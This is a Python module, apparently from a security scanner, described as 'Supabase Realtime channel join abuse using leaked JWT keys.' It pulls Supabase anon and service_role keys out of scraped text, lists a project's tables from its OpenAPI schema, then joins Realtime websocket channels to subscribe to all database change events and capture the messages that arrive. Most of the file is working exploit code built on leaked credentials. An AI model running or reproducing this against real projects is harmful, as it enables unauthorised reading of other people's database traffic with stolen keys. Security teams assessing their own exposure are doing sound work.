#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Supabase Realtime channel join abuse using leaked JWT keys."""

from __future__ import annotations

import json
import time
from typing import Any, Dict, List, Optional, Tuple

from lib.scanner.http.supabase_probe import (
    classify_supabase_key,
    decode_supabase_jwt,
    extract_supabase_findings,
    fetch_openapi_schema,
    parse_openapi_tables,
)


def _phoenix_join(topic: str, access_token: str) -> str:
    payload = {
        "topic": topic,
        "event": "phx_join",
        "payload": {
            "config": {
                "broadcast": {"self": True},
                "presence": {"key": ""},
                "postgres_changes": [
                    {
                        "event": "*",
                        "schema": "public",
                        "table": topic.split(":")[-1] if ":" in topic else "",
                    }
                ],
            },
            "access_token": access_token,
        },
        "ref": "1",
    }
    return json.dumps(payload)


def probe_realtime_channel(
    project_ref: str,
    api_key: str,
    table: str,
    *,
    timeout: float = 6.0,
) -> Dict[str, Any]:
    safe_table = "".join(c for c in (table or "") if c.isalnum() or c == "_")
    topic = f"realtime:public:{safe_table}" if safe_table else "realtime:public"
    ws_url = (
        f"wss://{project_ref}.supabase.co/realtime/v1/websocket"
        f"?apikey={api_key}&vsn=1.0.0"
    )
    result: Dict[str, Any] = {
        "table": safe_table,
        "topic": topic,
        "joined": False,
        "detail": "",
        "messages": [],
    }
    messages: List[str] = []
    try:
        import websocket

        ws_conn = websocket.create_connection(ws_url, timeout=timeout)
        ws_conn.send(_phoenix_join(topic, api_key))
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                ws_conn.settimeout(max(0.5, deadline - time.time()))
                messages.append(ws_conn.recv())
            except Exception:
                break
        ws_conn.close()
    except ImportError:
        result["detail"] = "websocket_client_missing"
        return result
    except Exception as exc:
        result["detail"] = str(exc)
        return result

    result["messages"] = messages[:3]
    joined = any("phx_reply" in m and "ok" in m.lower() for m in messages)
    if not joined:
        joined = any('"status":"ok"' in m or '"status": "ok"' in m for m in messages)
    result["joined"] = joined
    result["severity"] = "high" if joined else "info"
    return result


def enumerate_realtime_channels(
    session,
    project_ref: str,
    api_key: str,
    tables: Optional[List[str]] = None,
    *,
    verify_ssl: bool = True,
    max_tables: int = 8,
) -> List[Dict[str, Any]]:
    if not tables:
        schema, _detail = fetch_openapi_schema(project_ref, api_key, session, verify_ssl=verify_ssl)
        tables = parse_openapi_tables(schema or {}) if schema else []
    findings: List[Dict[str, Any]] = []
    for table in (tables or [])[:max_tables]:
        hit = probe_realtime_channel(project_ref, api_key, table)
        if hit.get("joined"):
            findings.append(hit)
    if not findings and tables:
        findings.append(probe_realtime_channel(project_ref, api_key, tables[0]))
    return findings


def pick_supabase_realtime_credentials(text: str) -> Tuple[str, str, str]:
    findings = extract_supabase_findings(text[:600_000], source="/")
    key_findings = [f for f in findings if f.get("token")]

    def rank(item):
        role = str(item.get("role") or "")
        if role == "anon":
            return 0
        if role == "service_role":
            return 1
        return 2

    key_findings.sort(key=rank)
    if not key_findings:
        return "", "", ""
    chosen = key_findings[0]
    ref = str(chosen.get("project_ref") or "").strip()
    key = str(chosen.get("token") or "").strip()
    role = classify_supabase_key(key, var_name=str(chosen.get("var_name") or ""))
    if not ref and key:
        payload = decode_supabase_jwt(key) or {}
        ref = str(payload.get("ref") or "").strip()
    return ref, key, role


__all__ = [
    "enumerate_realtime_channels",
    "pick_supabase_realtime_credentials",
    "probe_realtime_channel",
]
